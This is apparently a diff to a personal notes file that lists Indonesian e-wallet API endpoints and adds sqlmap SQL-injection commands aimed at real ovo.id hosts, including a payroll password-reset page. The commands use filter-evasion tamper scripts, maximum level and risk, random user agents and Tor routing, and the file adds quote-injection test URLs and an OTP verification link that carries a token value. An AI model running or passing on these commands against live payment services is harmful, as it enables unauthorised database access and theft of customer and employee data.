@@ -10,4 +10,15 @@ https://m.dana.id/wallet/api/alipayplus.mobilewallet.pocket.numUpdated.json
 /v3/getdata/balance/TOKOPEDIAWALLET HTTP/2
 
 
+python sqlmap.py -u https://www.ovo.id/index/information --dbs --tamper="between,randomcase,space2comment" --level=3 --risk=3 -v 3 --random-agent 
 
+https://www.ovo.id/news/detail/4-film-baru-yang-paling-ditunggu
+python sqlmap.py -u https://payroll.ovo.id/forgotUser.html --dbs --tamper="between,randomcase,space2comment" -v 3 --random-agent --tor
+
+python sqlmap.py -u https://bugbounty.ovo.id/scope' --dbs --tamper="between,randomcase,space2comment" -v 3 --level=3 --risk=3 --random-agent 
+
+https://bugbounty.ovo.id/scope'
+
+https://www.ovo.id/index/information%22
+
+https://ovo.id/app/verification?type=VERIFICATION&otp_ref_id=2d00a907-e2b6-4af9-9c3f-1bc2a287e73e&otp=8e9092c2cb232659efb4272e77bb52f5799498626f06f010b8aee587a0f779e7
